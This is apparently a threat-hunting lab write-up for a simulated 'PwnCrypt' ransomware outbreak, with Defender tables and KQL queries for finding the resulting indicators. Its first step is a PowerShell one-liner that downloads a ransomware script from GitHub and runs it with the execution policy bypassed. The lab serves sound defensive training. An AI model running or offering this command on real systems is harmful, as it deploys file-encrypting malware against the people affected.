# Threat Event (Zero Day Ransomware PwnCrypt Outbreak)
**Use of Powershell to run "Malicious" script**

## Steps the "Bad Actor" took Create Logs and IoCs:
1. Execute the following code in Powershell:
- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`

## What this script does:
-Intended for use in controlled environments only. This script performs two main actions:

    Downloads a PowerShell script:
    It uses Invoke-WebRequest to retrieve pwncrypt.ps1 from a GitHub URL and saves it to C:\programdata\pwncrypt.ps1.

    Executes the downloaded script:
    It then uses cmd to launch PowerShell with execution policy bypassed, running the downloaded pwncrypt.ps1 script.

- This allows the script to run without user confirmation or policy restrictions, simulating how a malicious payload might be delivered and executed during a cyberattack scenario. 
---

## Tables Used to Detect IoCs:

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect for any files with `pwncrypt`.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to determine delivery method and identify persistent malicious mechanisms. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to identify if there is any communication with a C2 server.|

---

## Related Queries:
```kql
// Search the FileEvents table for the IoCs described in the briefing
let VMName = "windows-target-1";
DeviceFileEvents
| where DeviceName == VMName
| where FileName contains ".pwncrypt"
| order by Timestamp desc

// Search the DeviceProcessEvents table for logs around the same time
let VMName = "windows-target-1";
let specificTime = datetime(2024-10-16T05:24:46.8334943Z);
DeviceProcessEvents
| where DeviceName == VMName
| where Timestamp between ((specificTime - 3m) .. (specificTime + 3m))
| order by Timestamp desc


```

---

## Created By:
- **Author Name**: Jordan West
- **Author Contact**: https://www.linkedin.com/in/jordan-west-it/
- **Date**: April 16, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 2.0         | Initial draft                 | `April 16, 2025`  | `Jordan West`   |


